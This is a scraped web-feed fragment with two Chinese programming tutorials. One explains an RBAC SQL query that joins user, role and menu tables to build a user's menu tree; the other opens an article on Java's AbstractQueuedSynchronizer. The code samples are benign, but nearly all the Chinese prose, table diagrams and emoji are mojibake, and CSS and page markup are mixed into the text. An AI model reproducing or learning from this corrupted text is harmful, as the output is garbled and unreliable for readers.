.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å…ˆçœ‹å®Œæ•´ SQLï¼ˆåŸæ ·ï¼‰</h2>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">select</span> m.*
<span class="hljs-keyword">from</span> menu m
left <span class="hljs-keyword">join</span> role_menu rm <span class="hljs-keyword">on</span> rm.menu_id = m.id
<span class="hljs-keyword">where</span> rm.<span class="hljs-function">role_id <span class="hljs-title">in</span> (<span class="hljs-params">
  <span class="hljs-keyword">select</span> role_id <span class="hljs-keyword">from</span> user_role <span class="hljs-keyword">where</span> user_id = ?
</span>)
order <span class="hljs-keyword">by</span> m.parent_id, m.sort</span>;
</code></pre>
<hr/>
<h2 data-id="heading-1">äºŒã€å…ˆææ¸…æ¥š 4 å¼ è¡¨åœ¨å¹²ä»€ä¹ˆï¼ˆéå¸¸å…³é”®ï¼‰</h2>
<h3 data-id="heading-2">1ï¸âƒ£ userï¼ˆç”¨æˆ·ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">user
â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-built_in">id</span> â”‚ username â”‚
â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h3 data-id="heading-3">2ï¸âƒ£ roleï¼ˆè§’è‰²ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">role
â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-built_in">id</span> â”‚ role_codeâ”‚
â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h3 data-id="heading-4">3ï¸âƒ£ user_roleï¼ˆç”¨æˆ·-è§’è‰²å…³ç³»ï¼‰</h3>
<blockquote>
<p><strong>ä¸€ä¸ªç”¨æˆ·å¯ä»¥æœ‰å¤šä¸ªè§’è‰²</strong></p>
</blockquote>
<pre><code class="hljs">user_role
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ user_idâ”‚ role_idâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h3 data-id="heading-5">4ï¸âƒ£ menuï¼ˆèœå•ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">menu
â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-built_in">id</span> â”‚parent_idâ”‚ name     â”‚ path    â”‚ <span class="hljs-built_in">sort</span> â”‚
â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<blockquote>
<p><code>parent_id</code> ç”¨æ¥è¡¨ç¤ºèœå•å±‚çº§ï¼ˆçˆ¶å­èœå•ï¼‰</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">5ï¸âƒ£ role_menuï¼ˆè§’è‰²-èœå•å…³ç³»ï¼‰</h3>
<blockquote>
<p><strong>è§’è‰²èƒ½è®¿é—®å“ªäº›èœå•</strong></p>
</blockquote>
<pre><code class="hljs">role_menu
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ role_idâ”‚ menu_idâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h2 data-id="heading-7">ä¸‰ã€æ•´ä½“ä¸€å¥è¯è§£é‡Šè¿™æ¡ SQL åœ¨å¹²å˜›</h2>
<blockquote>
<p><strong>â€œæŸ¥å‡ºæŸä¸ªç”¨æˆ· â†’ æ‰€æœ‰è§’è‰² â†’ èƒ½è®¿é—®çš„æ‰€æœ‰èœå•ï¼Œå¹¶æŒ‰èœå•å±‚çº§æ’åºâ€</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-8">å››ã€é€å¥æ‹†è§£ï¼ˆé‡ç‚¹ï¼‰</h2>
<hr/>
<h3 data-id="heading-9">ğŸ”¹ â‘  å­æŸ¥è¯¢ï¼šå…ˆæŸ¥ç”¨æˆ·æœ‰å“ªäº›è§’è‰²</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">select</span> role_id <span class="hljs-keyword">from</span> user_role <span class="hljs-keyword">where</span> user_id = ?
</code></pre>
<h4 data-id="heading-10">å‡è®¾ï¼š</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">user_id</span> = <span class="hljs-number">10</span>
</code></pre>
<h4 data-id="heading-11">user_role è¡¨ï¼š</h4>

















<table><thead><tr><th>user_id</th><th>role_id</th></tr></thead><tbody><tr><td>10</td><td>1</td></tr><tr><td>10</td><td>2</td></tr></tbody></table>
<h4 data-id="heading-12">å­æŸ¥è¯¢ç»“æœï¼š</h4>
<pre><code class="hljs language-scss" lang="scss">(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
</code></pre>
<p>ğŸ‘‰ <strong>æ„æ€ï¼šè¿™ä¸ªç”¨æˆ·æœ‰ 2 ä¸ªè§’è‰²</strong></p>
<hr/>
<h3 data-id="heading-13">ğŸ”¹ â‘¡ where rm.role_id in (...)</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">where</span> rm.role_id <span class="hljs-keyword">in</span> (1, 2)
</code></pre>
<p>ğŸ‘‰ <strong>åªè¦æ˜¯è§’è‰² 1 æˆ– è§’è‰² 2 æ‹¥æœ‰çš„èœå•ï¼Œéƒ½è¦</strong></p>
<hr/>
<h3 data-id="heading-14">ğŸ”¹ â‘¢ left join role_menu</h3>
<pre><code class="hljs language-bash" lang="bash">left <span class="hljs-built_in">join</span> role_menu <span class="hljs-built_in">rm</span> on rm.menu_id = m.id
</code></pre>
<h4 data-id="heading-15">ä½œç”¨ä¸€å¥è¯ï¼š</h4>
<blockquote>
<p><strong>æŠŠâ€œèœå•â€å’Œâ€œè§’è‰²-èœå•å…³ç³»â€è¿èµ·æ¥</strong></p>
</blockquote>
<h4 data-id="heading-16">ç¤ºä¾‹ role_menu è¡¨ï¼š</h4>





















<table><thead><tr><th>role_id</th><th>menu_id</th></tr></thead><tbody><tr><td>1</td><td>101</td></tr><tr><td>1</td><td>102</td></tr><tr><td>2</td><td>103</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-17">ğŸ”¹ â‘£ select m.*</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">select</span> m.*
</code></pre>
<p>ğŸ‘‰ <strong>åªè¦èœå•å­—æ®µï¼Œä¸å…³å¿ƒ role_menu çš„å­—æ®µ</strong></p>
<p>æœ€ç»ˆä½ å¾—åˆ°çš„ï¼Œæ˜¯ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">menu</span> è¡¨ä¸­çš„æ•°æ®
</code></pre>
<hr/>
<h2 data-id="heading-18">äº”ã€æ•´ä½“æ‰§è¡Œæµç¨‹ï¼ˆä¸€æ­¥ä¸€æ­¥ï¼‰</h2>
<h3 data-id="heading-19">ğŸ§  æ•°æ®åº“çœŸå®æ‰§è¡Œé€»è¾‘æ˜¯è¿™æ ·çš„ï¼š</h3>
<h3 data-id="heading-20">Step 1ï¸âƒ£ï¼šæŸ¥ç”¨æˆ·è§’è‰²</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">user_id</span> = <span class="hljs-number">10</span>
â†“
è§’è‰² = <span class="hljs-section">[1, 2]</span>
</code></pre>
<hr/>
<h3 data-id="heading-21">Step 2ï¸âƒ£ï¼šæŸ¥è¿™äº›è§’è‰²èƒ½è®¿é—®çš„èœå•</h3>
<pre><code class="hljs language-css" lang="css">role <span class="hljs-number">1</span> â†’ <span class="hljs-selector-tag">menu</span> <span class="hljs-number">101</span>, <span class="hljs-number">102</span>
role <span class="hljs-number">2</span> â†’ <span class="hljs-selector-tag">menu</span> <span class="hljs-number">103</span>
</code></pre>
<hr/>
<h3 data-id="heading-22">Step 3ï¸âƒ£ï¼šåˆå¹¶å»é‡åèœå•</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">menu</span> <span class="hljs-number">101</span>
<span class="hljs-selector-tag">menu</span> <span class="hljs-number">102</span>
<span class="hljs-selector-tag">menu</span> <span class="hljs-number">103</span>
</code></pre>
<hr/>
<h3 data-id="heading-23">Step 4ï¸âƒ£ï¼šæ’åº</h3>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> m.parent_id, m.sort
</code></pre>
<h4 data-id="heading-24">æ’åºç›®çš„ï¼š</h4>
<ul>
<li>å…ˆæŒ‰çˆ¶èœå•åˆ†ç»„</li>
<li>å†æŒ‰èœå•é¡ºåºæ’åˆ—</li>
</ul>
<p>ğŸ‘‰ <strong>æ–¹ä¾¿å‰ç«¯ç›´æ¥ç”Ÿæˆæ ‘å½¢èœå•</strong></p>
<hr/>
<h2 data-id="heading-25">å…­ã€ä¸ºä»€ä¹ˆè¦ç”¨ <code>LEFT JOIN</code> è€Œä¸æ˜¯ <code>INNER JOIN</code>ï¼Ÿ</h2>
<h3 data-id="heading-26">å®é™…ä¸Šï¼š</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-operator">+</span> <span class="hljs-keyword">where</span> rm.role_id <span class="hljs-keyword">in</span> (...)
</code></pre>
<p>â¬‡ï¸<br/>
<strong>æ•ˆæœç­‰åŒäº INNER JOIN</strong></p>
<h3 data-id="heading-27">é‚£ä¸ºä»€ä¹ˆå¾ˆå¤šäººè¿˜å†™ LEFT JOINï¼Ÿ</h3>
<p>1ï¸âƒ£ å†™æ³•æ›´é€šç”¨<br/>
2ï¸âƒ£ ä»¥åå¯ä»¥æ‰©å±•ï¼ˆæ¯”å¦‚å…è®¸ç©ºè§’è‰²ï¼‰<br/>
3ï¸âƒ£ å†å²ä»£ç ä¹ æƒ¯</p>
<p>ğŸ‘‰ <strong>å¦‚æœä½ æ„¿æ„ï¼Œå®Œå…¨å¯ä»¥æ”¹æˆï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">select</span> m.*
<span class="hljs-keyword">from</span> menu m
inner <span class="hljs-keyword">join</span> role_menu rm <span class="hljs-keyword">on</span> rm.menu_id = m.id
<span class="hljs-keyword">where</span> rm.<span class="hljs-function">role_id <span class="hljs-title">in</span> (<span class="hljs-params">
  <span class="hljs-keyword">select</span> role_id <span class="hljs-keyword">from</span> user_role <span class="hljs-keyword">where</span> user_id = ?
</span>)
order <span class="hljs-keyword">by</span> m.parent_id, m.sort</span>;
</code></pre>
<hr/>
<h2 data-id="heading-28">ä¸ƒã€ä¸ºä»€ä¹ˆä¸ç”¨ä¸‰è¡¨ç›´æ¥ joinï¼Ÿ</h2>
<p>ä½ ä¹Ÿå¯ä»¥å†™æˆï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> m.*
<span class="hljs-keyword">from</span> user_role ur
<span class="hljs-keyword">join</span> role_menu rm <span class="hljs-keyword">on</span> rm.role_id = ur.role_id
<span class="hljs-keyword">join</span> menu m <span class="hljs-keyword">on</span> m.id = rm.menu_id
<span class="hljs-keyword">where</span> ur.user_id = ?
<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> m.parent_id, m.sort;
</code></pre>
<h3 data-id="heading-29">ä¸¤ç§å†™æ³•å¯¹æ¯”</h3>

















<table><thead><tr><th>å†™æ³•</th><th>ä¼˜ç‚¹</th></tr></thead><tbody><tr><td>å­æŸ¥è¯¢ in</td><td>æ˜“è¯»ã€å¥½ç†è§£</td></tr><tr><td>å¤šè¡¨ join</td><td>æ€§èƒ½ç¨å¥½ã€ä¸“ä¸š</td></tr></tbody></table>
<p>ğŸ‘‰ <strong>ä¸­å°é¡¹ç›®ä¸¤ç§éƒ½å®Œå…¨æ²¡é—®é¢˜</strong></p>
<hr/>
<h2 data-id="heading-30">å…«ã€æœ€ç»ˆè¿”å›çš„æ•°æ®é•¿ä»€ä¹ˆæ ·ï¼Ÿ</h2>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[  {    <span class="hljs-string">"id"</span>: 1,    <span class="hljs-string">"parent_id"</span>: 0,    <span class="hljs-string">"name"</span>: <span class="hljs-string">"ç³»ç»Ÿç®¡ç†"</span>,    <span class="hljs-string">"path"</span>: <span class="hljs-string">"/system"</span>,    <span class="hljs-string">"sort"</span>: 1  },  {    <span class="hljs-string">"id"</span>: 2,    <span class="hljs-string">"parent_id"</span>: 1,    <span class="hljs-string">"name"</span>: <span class="hljs-string">"ç”¨æˆ·ç®¡ç†"</span>,    <span class="hljs-string">"path"</span>: <span class="hljs-string">"/system/user"</span>,    <span class="hljs-string">"sort"</span>: 1  }]</span>
</code></pre>
<p>å‰ç«¯å¯ä»¥ <strong>ç›´æ¥é€’å½’ç”Ÿæˆèœå•æ ‘</strong></p>
<hr/>
<h2 data-id="heading-31">ä¹ã€è¿™æ¡ SQL åœ¨ RBAC ä¸­çš„â€œåœ°ä½â€</h2>
<p>ğŸ‘‰ <strong>90% çš„åå°ç³»ç»Ÿï¼Œèœå•æŸ¥è¯¢å°±æ˜¯è¿™ä¸€ç±» SQL</strong></p>
<p>ä½ å­¦ä¼šè¿™ä¸€æ¡ï¼Œå°±å·²ç»ï¼š</p>
<ul>
<li>âœ” ç†è§£äº† RBAC çš„æ ¸å¿ƒ</li>
<li>âœ” èƒ½ç‹¬ç«‹è®¾è®¡èœå•æƒé™</li>
<li>âœ” çœ‹å¾—æ‡‚å¤§å¤šæ•°åå°æºç </li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå¹¶å‘ç¼–ç¨‹åŸºçŸ³ï¼šæ·±å…¥è§£æAQSåŸç†ä¸åº”ç”¨å®æˆ˜]]></title>    <link>https://juejin.cn/post/7582845425402347560</link>    <guid>https://juejin.cn/post/7582845425402347560</guid>    <pubDate>2025-12-13T03:06:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582845425402347560" data-draft-id="7582783931164327971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaå¹¶å‘ç¼–ç¨‹åŸºçŸ³ï¼šæ·±å…¥è§£æAQSåŸç†ä¸åº”ç”¨å®æˆ˜"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-13T03:06:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç§‘å¨èˆŸçš„ä»£ç ç¬”è®°"/> <meta itemprop="url" content="https://juejin.cn/user/1732486058230174"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå¹¶å‘ç¼–ç¨‹åŸºçŸ³ï¼šæ·±å…¥è§£æAQSåŸç†ä¸åº”ç”¨å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486058230174/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç§‘å¨èˆŸçš„ä»£ç ç¬”è®°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T03:06:05.000Z" title="Sat Dec 13 2025 03:06:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>[toc]</p>
<h2 data-id="heading-0">1 AQSæ¦‚è¿°ï¼šå¹¶å‘ç¼–ç¨‹çš„åŸºçŸ³</h2>
<p>AbstractQueuedSynchronizerï¼ˆAQSï¼‰æ˜¯Javaå¹¶å‘åŒ…ï¼ˆjava.util.concurrent.locksï¼‰çš„æ ¸å¿ƒåŸºç¡€æ¡†æ¶ï¼Œä¸ºæ„å»ºé”å’ŒåŒæ­¥å™¨æä¾›äº†å¯é‡ç”¨çš„åŸºç¡€è®¾æ–½ã€‚AQSé€šè¿‡<strong>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</strong>è®©å¼€å‘è€…èƒ½å¤ŸåŸºäºçŠ¶æ€å’Œé˜Ÿåˆ—è½»æ¾æ„å»ºå„ç§åŒæ­¥å™¨ï¼Œå¦‚ReentrantLockã€Semaphoreã€CountDownLatchç­‰å¸¸è§å¹¶å‘å·¥å…·ã€‚</p>
<p>AQSçš„æ ¸å¿ƒè®¾è®¡æ€æƒ³æ˜¯ï¼šå¦‚æœè¢«è¯·æ±‚çš„å…±äº«èµ„æºç©ºé—²ï¼Œåˆ™å°†å½“å‰è¯·æ±‚èµ„æºçš„çº¿ç¨‹è®¾ç½®ä¸ºæœ‰æ•ˆå·¥ä½œçº¿ç¨‹ï¼Œå¹¶å°†å…±äº«èµ„æºè®¾ç½®ä¸ºé”å®šçŠ¶æ€ï¼›å¦‚æœå…±äº«èµ„æºè¢«å ç”¨ï¼Œåˆ™éœ€è¦ä¸€å¥—çº¿ç¨‹é˜»å¡ç­‰å¾…ä»¥åŠè¢«å”¤é†’æ—¶é”åˆ†é…çš„æœºåˆ¶ã€‚è¿™å¥—æœºåˆ¶é€šè¿‡<strong>CLHé˜Ÿåˆ—é”</strong>å®ç°ï¼Œå°†æš‚æ—¶è·å–ä¸åˆ°é”çš„çº¿ç¨‹åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­ã€‚</p>
<p>ä¸ä¼ ç»Ÿçš„synchronizedå…³é”®å­—ç›¸æ¯”ï¼ŒAQSå…·æœ‰æ˜¾è‘—ä¼˜åŠ¿ï¼šå®ƒç”±Javaè¯­è¨€å®ç°ï¼ˆè€ŒéC++ï¼‰ï¼Œæä¾›äº†æ›´çµæ´»çš„APIï¼Œå¹¶ä¸”åœ¨é”ç«äº‰æ¿€çƒˆçš„æƒ…å†µä¸‹æä¾›äº†å¤šç§è§£å†³æ–¹æ¡ˆï¼Œæ€§èƒ½è¡¨ç°æ›´ä¼˜ã€‚</p>
<h2 data-id="heading-1">2 AQSæ ¸å¿ƒåŸç†ä¸æ¶æ„è®¾è®¡</h2>
<h3 data-id="heading-2">2.1 æ ¸å¿ƒç»„ä»¶ï¼šçŠ¶æ€å˜é‡ä¸åŒæ­¥é˜Ÿåˆ—</h3>
<p>AQSçš„æ ¸å¿ƒæ¶æ„å›´ç»•ä¸¤ä¸ªå…³é”®ç»„ä»¶æ„å»ºï¼š<strong>åŒæ­¥çŠ¶æ€ï¼ˆstateï¼‰<strong>å’Œ</strong>ç­‰å¾…é˜Ÿåˆ—</strong>ã€‚</p>
<p>**åŒæ­¥çŠ¶æ€ï¼ˆstateï¼‰**æ˜¯ä¸€ä¸ªvolatile intç±»å‹çš„å˜é‡ï¼Œè¡¨ç¤ºå…±äº«èµ„æºçš„çŠ¶æ€ã€‚å…¶å…·ä½“è¯­ä¹‰ç”±å­ç±»å®šä¹‰ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>åœ¨ReentrantLockä¸­ï¼Œstateè¡¨ç¤ºé”çš„é‡å…¥æ¬¡æ•°</li>
<li>åœ¨Semaphoreä¸­ï¼Œstateè¡¨ç¤ºå¯ç”¨çš„è®¸å¯è¯æ•°é‡</li>
<li>åœ¨CountDownLatchä¸­ï¼Œstateè¡¨ç¤ºæœªå®Œæˆçš„è®¡æ•°</li>
</ul>
<p>AQSæä¾›äº†ä¸‰ç§åŸå­æ“ä½œæ–¹æ³•æ¥ç®¡ç†stateï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> state; }
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> { state = newState; }
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSetState</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
    <span class="hljs-comment">// CASæ“ä½œï¼Œä¿è¯åŸå­æ€§</span>
}
</code></pre>
<p><strong>ç­‰å¾…é˜Ÿåˆ—</strong>æ˜¯AQSç®¡ç†çš„CLHï¼ˆCraig, Landin, and Hagerstenï¼‰é˜Ÿåˆ—çš„å˜ä½“ï¼Œæ˜¯ä¸€ä¸ª<strong>FIFOåŒå‘é“¾è¡¨</strong>ï¼Œç”¨äºå­˜å‚¨ç­‰å¾…è·å–é”çš„çº¿ç¨‹ã€‚é˜Ÿåˆ—ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ï¼ˆNodeï¼‰åŒ…å«çº¿ç¨‹å¼•ç”¨ã€ç­‰å¾…çŠ¶æ€ä»¥åŠå‰åæŒ‡é’ˆã€‚</p>
<h3 data-id="heading-3">2.2 èŠ‚ç‚¹çŠ¶æ€ä¸é˜Ÿåˆ—ç®¡ç†</h3>
<p>AQSé˜Ÿåˆ—ä¸­çš„èŠ‚ç‚¹å­˜åœ¨å¤šç§ç­‰å¾…çŠ¶æ€ï¼Œå†³å®šäº†çº¿ç¨‹çš„æ’é˜Ÿè¡Œä¸ºï¼š</p>
<ul>
<li><strong>CANCELLEDï¼ˆ1ï¼‰</strong>ï¼šèŠ‚ç‚¹å› è¶…æ—¶æˆ–ä¸­æ–­è¢«å–æ¶ˆï¼Œä¸å†å‚ä¸åŒæ­¥</li>
<li><strong>SIGNALï¼ˆ-1ï¼‰</strong>ï¼šåç»§èŠ‚ç‚¹éœ€è¦è¢«å”¤é†’</li>
<li><strong>CONDITIONï¼ˆ-2ï¼‰</strong>ï¼šèŠ‚ç‚¹åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­ç­‰å¾…</li>
<li><strong>PROPAGATEï¼ˆ-3ï¼‰</strong>ï¼šå…±äº«æ¨¡å¼ä¸‹çŠ¶æ€å˜æ›´éœ€è¦ä¼ æ’­</li>
<li><strong>0</strong>ï¼šåˆå§‹çŠ¶æ€</li>
</ul>
